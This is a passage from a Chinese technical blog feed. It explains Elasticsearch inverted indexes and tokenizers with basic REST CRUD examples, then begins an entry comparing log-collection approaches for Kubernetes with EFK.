goodsDetails、goodsSEO</p><p>我们去设计索引是将goodsName去拆分出词，按照商品名称搜索到该条记录值，但是我们将这条记录放到互联网，那么搜索范围是不是就小太多了？我如果想根据goodsSEO、goodsDetails中的关键词搜索，是不是范围就大了很多，那如何设计呢？</p><p>有同学肯定说，那就把goodsSEO、goodsDetails中的词也索引了不就得了，一了百了。</p><p>对的，搜索引擎就是这么干的，他把标题、内容都给索引了，这么做，就是倒排&#x2F;倒置索引，正常的数据数据是：key&#x2F;value形式，按照key索引即可，倒排索引是按照value去索引，当然了，es是将每个字段都给索引了，也就是每个字段都给你整了一套分词、索引，是不是很贴心？很low？😂</p><p>将文档内容进行索引，后面的Document代表该条记录的ID值，也就是整条数据，比如找到了Term中butterfly就找到了Document1了。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/568a708ef5364b10bf79ab56b1c2883a.png" alt="img"></p><h3 id="2-3-2-倒排索引的工作原理"><a href="#2-3-2-倒排索引的工作原理" class="headerlink" title="2.3.2.倒排索引的工作原理"></a>2.3.2.倒排索引的工作原理</h3><p>倒排索引的主要工作原理是将文档中的词汇映射到包含这些词汇的文档列表。以下是倒排索引的构建步骤和基本原理：</p><ol><li><strong>文档分词</strong>：首先，将文档中的文本分割成单独的词汇（即分词）。这一步通常使用分词器（Tokenizer）来完成。</li><li><strong>去除停用词</strong>：分词后，通常会去除一些常见但无意义的词汇，如 “the”、”is” 等，这些词汇称为停用词（Stop Words）。</li><li><strong>建立词汇表</strong>：创建一个包含所有唯一词汇的词汇表。</li><li><strong>建立倒排列表</strong>：对于每个词汇，创建一个倒排列表，记录该词汇在哪些文档中出现以及出现的位置。</li></ol><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>假设我们有以下三个文档：</p><ul><li>文档 1：<code>&quot;Elasticsearch is a search engine&quot;</code></li><li>文档 2：<code>&quot;Elasticsearch uses inverted index&quot;</code></li><li>文档 3：<code>&quot;Inverted index improves search efficiency&quot;</code></li></ul><p>分词和去除停用词后，我们得到以下词汇表和倒排列表：</p><ul><li>词汇表：<code>[&quot;Elasticsearch&quot;, &quot;search&quot;, &quot;engine&quot;, &quot;uses&quot;, &quot;inverted&quot;, &quot;index&quot;, &quot;improves&quot;, &quot;efficiency&quot;]</code></li><li>倒排列表： <ul><li><code>&quot;Elasticsearch&quot;</code>：{文档 1, 文档 2}</li><li><code>&quot;search&quot;</code>：{文档 1, 文档 3}</li><li><code>&quot;engine&quot;</code>：{文档 1}</li><li><code>&quot;uses&quot;</code>：{文档 2}</li><li><code>&quot;inverted&quot;</code>：{文档 2, 文档 3}</li><li><code>&quot;index&quot;</code>：{文档 2, 文档 3}</li><li><code>&quot;improves&quot;</code>：{文档 3}</li><li><code>&quot;efficiency&quot;</code>：{文档 3}</li></ul></li></ul><p>通过倒排列表，我们可以快速定位包含特定词汇的文档，从而提高搜索效率。</p><h3 id="2-3-3-倒排索引在-Elasticsearch-中的实现"><a href="#2-3-3-倒排索引在-Elasticsearch-中的实现" class="headerlink" title="2.3.3.倒排索引在 Elasticsearch 中的实现"></a>2.3.3.倒排索引在 Elasticsearch 中的实现</h3><p>在 Elasticsearch 中，每个索引都使用倒排索引来实现快速的全文搜索。以下是 Elasticsearch 中倒排索引的实现和工作流程：</p><ol><li><strong>文档索引</strong>：当文档被索引时，Elasticsearch 会对文档中的文本字段进行分词和分析，生成一系列词汇。</li><li><strong>创建倒排索引</strong>：Elasticsearch 为每个词汇创建倒排列表，并将这些列表存储在索引中。</li><li><strong>搜索查询</strong>：当用户执行搜索查询时，Elasticsearch 使用倒排索引来快速定位包含查询词汇的文档，并根据相关性对结果进行排序。</li></ol><h3 id="2-3-2-1-分词器"><a href="#2-3-2-1-分词器" class="headerlink" title="2.3.2.1.分词器"></a>2.3.2.1.分词器</h3><p>Elasticsearch 使用<strong>分词器和分析器</strong>来处理文档中的文本。分词器将文本分割成词汇，而分析器则包括分词器和一系列过滤器，用于进一步处理词汇（如去除停用词、转换为小写等）。</p><p>在创建索引之前，会对文档中的字符串进行分词。ES中字符串有两种类型，<strong>keyword和text。</strong></p><ul><li><strong>keyword类型的字符串不会被分词</strong>，搜索时全匹配查询</li><li><strong>text类型的字符串会被分词</strong>，搜索时是包含查询</li></ul><p>不同的分词器对相同字符串分词的结果大有不同，选择不同的分词器对索引的创建有很大的影响</p><p>如拆分“中华人民共和国国歌”</p><ol><li>ik_max_word分词器: 最细粒度拆分，分词结果如下：<ul><li>中华人民共和国</li><li>中华人民</li><li>中华</li><li>华人</li><li>人民共和国</li><li>人民</li><li>人</li><li>民</li><li>共和国</li><li>共和</li><li>和</li><li>国国</li><li>国歌</li></ul></li><li>ik_smart分词器: 最粗粒度的拆分，分词结果如下：<ul><li>中华人民共和国</li><li>国歌</li></ul></li></ol><p>可见，再ES中创建索引，选择合适的分词器是很重要的。</p><h3 id="单词-文档矩阵"><a href="#单词-文档矩阵" class="headerlink" title="单词-文档矩阵"></a>单词-文档矩阵</h3><table><thead><tr><th>-</th><th>单词1</th><th>单词2</th><th>单词3</th><th>单词4</th></tr></thead><tbody><tr><td>文档1</td><td>√</td><td></td><td>√</td><td></td></tr><tr><td>文档2</td><td></td><td>√</td><td></td><td></td></tr><tr><td>文档3</td><td></td><td></td><td>√</td><td></td></tr><tr><td>文档4</td><td>√</td><td></td><td></td><td>√</td></tr></tbody></table><p><strong>该矩阵是表达单词和文档两者之间包含关系</strong>的概念模型。<br> 从<strong>横向看</strong>，每行代表文档包含了哪些单词，比如文档1包含了单词1和单词3，而不包含其它单词。<br> 从<strong>纵向看</strong>，每列代表了<strong>某个单词存在于哪些文档</strong>。比如单词1在文档1和文档4中出现过。</p><p>简单来说，<strong>索引就是实现“单词-文档矩阵”的具体数据结构，而倒排索引则是实现了这种数据结构的具体方式</strong>。</p><h3 id="2-3-4-倒排索引的构成"><a href="#2-3-4-倒排索引的构成" class="headerlink" title="2.3.4.倒排索引的构成"></a>2.3.4.倒排索引的构成</h3><p>倒排索引由两部分构成：</p><ul><li><strong>单词词典</strong></li><li><strong>倒排列表</strong></li></ul><p>它的结构如下：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/11f99b7f0a744b93aeeb4fcc66e96d3e.png" alt="img"></p><h3 id="2-3-4-1-单词词典"><a href="#2-3-4-1-单词词典" class="headerlink" title="2.3.4.1.单词词典"></a>2.3.4.1.单词词典</h3><p>单词词典的特性：</p><ol><li>是文档集合中所有单词的集合</li><li>它是保存索引的最小单位</li><li>其中<strong>记录着指向倒排列表的指针</strong></li></ol><p>单词词典的实现：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/51654073cac54c619e266a1b04c1b18a.png" alt="img"></p><p>单词词典有两种数据结构实现：<strong>B+树和Hash表（数据结构那篇文章中有详细介绍）</strong></p><p>B+树和Mysql索引结构中主键索引数据结构一样，这里就不再介绍了</p><p>哈希表的key是单词的hash值，值是单词的链表，因为hash算法会有冲突的情况发生，所以这里的值是一个集合，里面保存着相同hash值得单词以及改词指向倒排列表的指针</p><h3 id="2-3-4-2-倒排列表"><a href="#2-3-4-2-倒排列表" class="headerlink" title="2.3.4.2.倒排列表"></a>2.3.4.2.倒排列表</h3><p>倒排列表特性：</p><ol><li><strong>记录出现过某个单词的文档列表</strong></li><li><strong>同时还记录单词在所有文档中的出现次数和偏移位置</strong></li></ol><p>倒排列表<strong>元素数据结构</strong>：</p><p>其中：</p><ul><li>DocID：出现某单词的文档ID</li><li>TF(Term Frequency)：单词在该文档中出现的次数</li><li>POS：单词在文档中的位置</li></ul><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>有下面单个文档</p><table><thead><tr><th>-</th><th>内容</th></tr></thead><tbody><tr><td>文档1</td><td>百度的年度目标</td></tr><tr><td>文档2</td><td>AI技术生态部的年度目标</td></tr><tr><td>文档3</td><td>AI市场的年度目标</td></tr></tbody></table><p>则他们生成的倒排索引</p><table><thead><tr><th>单词ID</th><th>单词</th><th>逆向文档频率</th><th>倒排列表(DocID;TF;<POS>)</th></tr></thead><tbody><tr><td>1</td><td>目标</td><td>3</td><td>(1;1;&lt;3&gt;),(2;1;&lt;5&gt;),(3;1;&lt;4&gt;)</td></tr><tr><td>2</td><td>年度</td><td>3</td><td>(1;1;&lt;2&gt;),(2;1;&lt;4&gt;),(3;1;&lt;3&gt;)</td></tr><tr><td>3</td><td>AI</td><td>2</td><td>(2;1;&lt;1&gt;),(3;1;&lt;1&gt;)</td></tr><tr><td>4</td><td>技术</td><td>1</td><td>(2;1;&lt;2&gt;)</td></tr><tr><td>5</td><td>生态</td><td>1</td><td>(2;1;&lt;3&gt;)</td></tr><tr><td>6</td><td>市场</td><td>1</td><td>(3;1;&lt;2&gt;)</td></tr></tbody></table><p>比如单词“年度”，单词ID为2，在三个文档中出现过，所以逆向文档频率为3，同时倒排索引中的元素也有三个：<code>(1;1;&lt;2&gt;),(2;1;&lt;4&gt;),(3;1;&lt;3&gt;)</code>。拿第一个元素<code>(1;1;&lt;2&gt;)</code>进行说明，他表示“年度”再文档ID为1的文档中出现过1次，出现的位置是第二个单词</p><h3 id="2-3-6-倒排索引的搜索过程"><a href="#2-3-6-倒排索引的搜索过程" class="headerlink" title="2.3.6.倒排索引的搜索过程"></a>2.3.6.倒排索引的搜索过程</h3><p>直到了倒排索引的内部结构之后，就能很好理解倒排索引的搜索过程了，其内部搜索过程如下图所示：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/9000224cbbb9463ebd31f7a2f95f03ef.png" alt="img"></p><h3 id="2-3-7-倒排索引的优势"><a href="#2-3-7-倒排索引的优势" class="headerlink" title="2.3.7.倒排索引的优势"></a>2.3.7.倒排索引的优势</h3><p>倒排索引相比其他索引结构具有以下优势：</p><ul><li><strong>高效搜索</strong>：倒排索引允许<strong>快速定位包含特定词汇的文档</strong>，从而实现高效的全文搜索。</li><li><strong>灵活性</strong>：倒排索引适用于各种类型的搜索查询，包括布尔查询、短语查询和范围查询。</li><li><strong>扩展性</strong>：倒排索引可以<strong>轻松扩展以处理大规模数据</strong>，适用于分布式搜索系统。</li></ul><h2 id="2-4-RESTful-API-基本操作示例"><a href="#2-4-RESTful-API-基本操作示例" class="headerlink" title="2.4.RESTful API 基本操作示例"></a>2.4.RESTful API 基本操作示例</h2><p> RESTful API 是一种遵循 REST（Representational State Transfer）架构风格的应用程序接口。它利用 HTTP 协议的各种方法（如 GET、POST、PUT、DELETE 等）进行资源的创建、读取、更新和删除（CRUD 操作）。在 Elasticsearch 中，资源通常是索引、文档和搜索查询等。</p><h3 id="2-4-1-创建索引"><a href="#2-4-1-创建索引" class="headerlink" title="2.4.1. 创建索引"></a>2.4.1. 创建索引</h3><p>在 Elasticsearch 中，索引类似于数据库中的表，用于存储一类相似的文档。可以使用 PUT 请求创建一个新的索引。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PUT /my_index<br></code></pre></td></tr></table></figure><p> 响应示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;acknowledged&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;shards_acknowledged&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my_index&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-4-2-添加文档"><a href="#2-4-2-添加文档" class="headerlink" title="2.4.2. 添加文档"></a>2.4.2. 添加文档</h3><p>可以使用 POST 请求将文档添加到索引中。文档以 JSON 格式表示。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/my_index/</span>_doc/<span class="hljs-number">1</span><br>&#123;<br>  <span class="hljs-string">&quot;title&quot;</span>: <span class="hljs-string">&quot;Elasticsearch Introduction&quot;</span>,<br>  <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Elasticsearch is a powerful search engine.&quot;</span>,<br>  <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  <span class="hljs-string">&quot;publish_date&quot;</span>: <span class="hljs-string">&quot;2024-06-23&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p> 响应示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;_index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my_index&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;_doc&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;result&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;created&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_shards&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;total&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;successful&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;failed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_seq_no&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_primary_term&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-4-3-查询文档"><a href="#2-4-3-查询文档" class="headerlink" title="2.4.3. 查询文档"></a>2.4.3. 查询文档</h3><p>可以使用 GET 请求查询特定文档或执行搜索查询。以下示例展示了如何查询特定文档和执行全文搜索。</p><ul><li><strong>查询特定文档：</strong></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /my_index/_doc/1<br></code></pre></td></tr></table></figure><p>响应示例：</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">&#123;<br>  <span class="hljs-comment">&quot;_index&quot;</span>: <span class="hljs-comment">&quot;my_index&quot;</span>,<br>  <span class="hljs-comment">&quot;_type&quot;</span>: <span class="hljs-comment">&quot;_doc&quot;</span>,<br>  <span class="hljs-comment">&quot;_id&quot;</span>: <span class="hljs-comment">&quot;1&quot;</span>,<br>  <span class="hljs-comment">&quot;_version&quot;</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-comment">&quot;_seq_no&quot;</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-comment">&quot;_primary_term&quot;</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-comment">&quot;found&quot;</span>: <span class="hljs-keyword">true</span>,<br>  <span class="hljs-comment">&quot;_source&quot;</span>: &#123;<br>    <span class="hljs-comment">&quot;title&quot;</span>: <span class="hljs-comment">&quot;Elasticsearch Introduction&quot;</span>,<br>    <span class="hljs-comment">&quot;content&quot;</span>: <span class="hljs-comment">&quot;Elasticsearch is a powerful search engine.&quot;</span>,<br>    <span class="hljs-comment">&quot;author&quot;</span>: <span class="hljs-comment">&quot;John Doe&quot;</span>,<br>    <span class="hljs-comment">&quot;publish_date&quot;</span>: <span class="hljs-comment">&quot;2024-06-23&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>执行全文搜索：</strong></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /my_index/_search<br>&#123;<br>  <span class="hljs-string">&quot;query&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;match&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;search engine&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 响应示例：</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">&#123;<br>  <span class="hljs-comment">&quot;took&quot;</span>: <span class="hljs-number">12</span>,<br>  <span class="hljs-comment">&quot;timed_out&quot;</span>: <span class="hljs-keyword">false</span>,<br>  <span class="hljs-comment">&quot;_shards&quot;</span>: &#123;<br>    <span class="hljs-comment">&quot;total&quot;</span>: <span class="hljs-number">5</span>,<br>    <span class="hljs-comment">&quot;successful&quot;</span>: <span class="hljs-number">5</span>,<br>    <span class="hljs-comment">&quot;skipped&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-comment">&quot;failed&quot;</span>: <span class="hljs-number">0</span><br>  &#125;,<br>  <span class="hljs-comment">&quot;hits&quot;</span>: &#123;<br>    <span class="hljs-comment">&quot;total&quot;</span>: &#123;<br>      <span class="hljs-comment">&quot;value&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-comment">&quot;relation&quot;</span>: <span class="hljs-comment">&quot;eq&quot;</span><br>    &#125;,<br>    <span class="hljs-comment">&quot;max_score&quot;</span>: <span class="hljs-number">0.2876821</span>,<br>    <span class="hljs-comment">&quot;hits&quot;</span>: [<br>      &#123;<br>        <span class="hljs-comment">&quot;_index&quot;</span>: <span class="hljs-comment">&quot;my_index&quot;</span>,<br>        <span class="hljs-comment">&quot;_type&quot;</span>: <span class="hljs-comment">&quot;_doc&quot;</span>,<br>        <span class="hljs-comment">&quot;_id&quot;</span>: <span class="hljs-comment">&quot;1&quot;</span>,<br>        <span class="hljs-comment">&quot;_score&quot;</span>: <span class="hljs-number">0.2876821</span>,<br>        <span class="hljs-comment">&quot;_source&quot;</span>: &#123;<br>          <span class="hljs-comment">&quot;title&quot;</span>: <span class="hljs-comment">&quot;Elasticsearch Introduction&quot;</span>,<br>          <span class="hljs-comment">&quot;content&quot;</span>: <span class="hljs-comment">&quot;Elasticsearch is a powerful search engine.&quot;</span>,<br>          <span class="hljs-comment">&quot;author&quot;</span>: <span class="hljs-comment">&quot;John Doe&quot;</span>,<br>          <span class="hljs-comment">&quot;publish_date&quot;</span>: <span class="hljs-comment">&quot;2024-06-23&quot;</span><br>        &#125;<br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-4-4-更新文档"><a href="#2-4-4-更新文档" class="headerlink" title="2.4.4. 更新文档"></a>2.4.4. 更新文档</h3><p>可以使用 POST 请求更新已存在的文档。更新操作会覆盖指定字段的内容。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/my_index/</span>_update/<span class="hljs-number">1</span><br>&#123;<br>  <span class="hljs-string">&quot;doc&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Elasticsearch is a powerful and flexible search engine.&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 响应示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;_index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my_index&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;_doc&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;result&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;updated&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_shards&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;total&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;successful&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;failed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_seq_no&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_primary_term&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-4-5-删除文档"><a href="#2-4-5-删除文档" class="headerlink" title="2.4.5. 删除文档"></a>2.4.5. 删除文档</h3><p>可以使用 DELETE 请求删除特定文档。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">DELETE</span> <span class="hljs-regexp">/my_index/</span>_doc/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>响应实例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;_index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my_index&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;_doc&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;result&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;deleted&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_shards&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;total&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;successful&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;failed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_seq_no&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;_primary_term&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>日志篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日志篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EFK采集k8s日志</title>
    <link href="/2025/04/16/EFK%E9%87%87%E9%9B%86k8s%E6%97%A5%E5%BF%97/"/>
    <url>/2025/04/16/EFK%E9%87%87%E9%9B%86k8s%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<p>​    在 Kubernetes 集群中，需要全面了解各个 pod 应用运行状态、故障排查和性能分析。但由于 Pod 是动态创建和销毁的，其日志分散且存储不持久，因此需要通过集中式日志采集方案，将日志收集到统一的平台并配置日志可视化分析和监控告警，以实现日志的可追溯性、实时监控和高效分析，从而提升运维效率和系统可靠性。</p><p>官网地址：<a href="https://kubernetes.io/zh/docs/concepts/cluster-administration/logging/">日志架构 | Kubernetes</a></p><h2 id="1-日志采集方案"><a href="#1-日志采集方案" class="headerlink" title="1.日志采集方案"></a>1.日志采集方案</h2><p><strong>方案一：ds控制器</strong></p><p>每个节点有且仅有一个日志采集的Pod。并不需要注入原有的Pod。DaemonSet + nodeSelector调度到指定节点。DaemonSet 相对资源占用要小很多，但扩展性、租户隔离性受限，比较适用于功能单一或业务不是很多的集群。</p><p>优点：节省资源</p><p>缺点：需要配置RBAC权限</p><p><strong>方案二：sidecar</strong></p><p>每个pod再起一个容器，安装filebeat采集数据，使用emptyDir共享pod中日志。Sidecar 相对资源占用较多，但灵活性以及多租户隔离性较强，建议大型的 K8s 集群或作为 PaaS 平台为多个业务方服务的集群使用该方式。</p><p>优点：可以直接和业务容器共享存储和网络，将日志采集到目的端。</p><p>缺点: 如果一个节点有五十个pod，那就要注入五十个filebeat采集，造成资源浪费</p><p><strong>方案三：开发自实现</strong></p><p>让程序本身支持日志采集功能。</p><p>优点：无需运维接入，只需配置对应目标接口</p><p>缺点：跨部门沟通，费时间</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6e5e2bc0104c49a5a5946abebc903b59.png" alt="img"></p><blockquote><p><strong>总结：</strong></p><p>  <strong>1. DaemonSet一般在中小型集群中使用</strong></p><p>   <strong>2. Sidecar推荐在超大型的集群中使用</strong></p><p>  <strong>3. 业务直写推荐在日志量极大的场景中使用</strong></p></blockquote><p><strong>三种方案优缺点：</strong> </p><p><img src="/Untitled.assets/4e47cb38331b43bda5414eaab67214ed.png" alt="img"></p><p>因为方案一在业界使用更为广泛，并且官方也更为推荐，所以我们基于方案一来做k8s的日志采集。</p><h2 id="2-创建单节点elasticsearch的yaml文件"><a href="#2-创建单节点elasticsearch的yaml文件" class="headerlink" title="2.创建单节点elasticsearch的yaml文件"></a>2.创建单节点elasticsearch的yaml文件</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 